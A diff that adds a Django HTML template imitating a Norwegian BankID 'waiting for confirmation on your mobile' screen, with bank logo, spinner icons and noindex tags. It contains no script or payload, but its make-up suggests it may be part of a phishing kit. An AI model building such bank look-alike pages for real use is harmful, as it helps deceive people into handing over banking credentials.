@@ -1,0 +1,62 @@
+{% load static %}
+<html lang="nb">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/png" href="{% static 'img/favicon.png' %}">
+    <title>BankID</title>
+    <link href="{% static 'style/main.css' %}" rel="stylesheet">
+    <style>
+        #container {
+            margin-top: 5%;
+            position: relative;
+        }
+
+        #img2 {
+            position: absolute;
+            left: 5px;
+            top: 15px;
+        }
+
+        #img3 {
+            position: absolute;
+            left: 5px;
+            top: 15px;
+        }
+    </style>
+</head>
+<body class="">
+<main class="container">
+    <div class="container__content">
+        <div class="bankid-logo-wrapper">
+            <img alt="" class="bankid-logo" src="{% static 'img/logo.svg' %}">
+        </div>
+
+        <div class="page" id="getNnin" style="">
+            <div class="page__content">
+                <span class="js-merchant-name merchant-name">PersonBankID</span>
+                <p id="privacyPolicyDeclaration" data-i18n="privacy_policy_declaration">Følg instruksene på din
+                    mobil</p>
+                <div id="container">
+                    <img class="bidm_icon"
+                         id="img1"
+                         src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iNTAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19iaW1vdHA8L3RpdGxlPjxnIGZpbGw9Im5vbmUiPjxyZWN0IGZpbGw9IiMwMDc4QkQiIHdpZHRoPSIzMCIgaGVpZ2h0PSI1MCIgcng9IjIiLz48cmVjdCBmaWxsPSIjZmZmIiB4PSIyIiB5PSI4IiB3aWR0aD0iMjYiIGhlaWdodD0iMzQiIHJ4PSIxIi8+PHJlY3QgZmlsbD0iI2ZmZiIgeD0iMTIiIHk9IjQ0IiB3aWR0aD0iNiIgaGVpZ2h0PSI0IiByeD0iMSIvPjwvZz48L3N2Zz4="
+                         title="Venter p&aring; bekreftelse" alt="Venter p&aring; bekreftelse">
+                    <img class="bidm_spinner"
+                         id="img2"
+                         src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19zcGlubmVyPC90aXRsZT48ZyBmaWxsPSJub25lIj48cGF0aCBkPSJNMTAgMXYyYzMuODYgMCA3IDMuMTQgNyA3IDAgMy44NTktMy4xNCA3LTcgN3YyYzQuOTcgMCA5LTQuMDMgOS05IDAtNC45NzEtNC4wMy05LTktOSIgZmlsbD0iI2ZmZiIvPjxwYXRoIGQ9Ik0xMCAzdi0yYy00Ljk3MSAwLTkgNC4wMjktOSA5IDAgNC45NyA0LjAyOSA5IDkgOXYtMmMtMy44NiAwLTctMy4xNDEtNy03IDAtMy44NiAzLjE0LTcgNy03eiIgZmlsbD0iIzAwNzhCRCIvPjwvZz48L3N2Zz4="
+                         alt="" title="Venter p&aring; bekreftelse">
+                    <img class="bidm_spinner bidm_no-animation"
+                         id="img3"
+                         src="data:image/gif;base64,R0lGODlhFAAUAMQAAP///+v1++n1+9/v993t99nr9dfr9dPp9dXp9dHn883l88nj8cfh8cHf77/d77XZ7bHX663V63a53Wqz22ix21qr11Kl1Uah0Uaf0TOZzBiJxw6DxQqBwwiBwwh+wwB6wSH/C05FVFNDQVBFMi4wAwEAAAAh+QQJDQAAACwKAAEACQASAAAFQOCnVRBgml/6ZckpMNL2cc9pBtjnKbaZZz1AQBYJSj6WIEMUFKSaz95SY0T2hp+i7WfD6Xiv2KwGUK1aqFHJFgIAIfkECQ0AAAAsAwADABAAEAAABVAgII7kaJTo6HhKimJf5pbB9kUzKX1WPjIfjU8k+HyGgOJxCBQOdz1f7TaEyQCMSwAVgLEAA85nI2EIBAyJjfMYJTLGeDyTQEEqGqOmAimFAAAh+QQJDQAAACwAAAoAEwAJAAAFTCDwfQJgnqgpjID2MWkMMJ8GWJ8kp9JnAZHPJrAzBTafiCnzwRQBmE/mpPA0ialA1KNAPThCCUMgYEiQnEcswRy5R5lEEVJx1SqQVAgAIfkECQ0AAAAsAAADABEAEAAABVAgICJiaZ6A4kloC2Qf5p7RtwWzaX1sXmofhq/0+QiGouIRCRQid71h7YZ8xaqqGO4UwFBMD45NwhAIGJLNh3MwJWDFeDGTaEEqwI+mAimFAAAh+QQJDQAAACwAAAEACgASAAAFQiAgjlClfSOQZF+Lig/3bRIjiIr3YUEKsBgfIDLr+SwfiRBwYixbNyF02VwilULixugDLnM77ig2q0VFK9crVTqFAAAh+QQJDQAAACwAAAEAEQAQAAAFTyAgjlClfZ9WQWObZGgcZ0n7cN8mMYLASJsPpyBSeD6YQEsUwEhGMMxyKorklNSl5fPMLk8M7xIlELfI5hE4Ldp209YNNh1lA4wTOwDBDgEAIfkECQ0AAAAsAAABABMACQAABUsgII5QpX2fVkFjKyYZKstZ4gIP920SIwgMyebDebQUng8mcAtgPh7FKIa5tZ4ZUWTHtIoCwwjA8pF4W5KPBXBinEeMFAAleIsEqBAAIfkECQ0AAAAsAwABABAAEAAABVEgIEKV9n1aBYkskGRnHGcJO3DfJjGCwEibD+fBamACLVEA8/EoklARMxOFBoKRalLysWhbDNSXJTiNReXPGRDWrLne8fWTHV8+1POC81wTRCEAOw=="
+                         alt="" title="Venter p&aring; bekreftelse">
+                </div>
+            </div>
+        </div>
+    </div>
+</main>
+<script>
+</script>
+</body>
+</html>
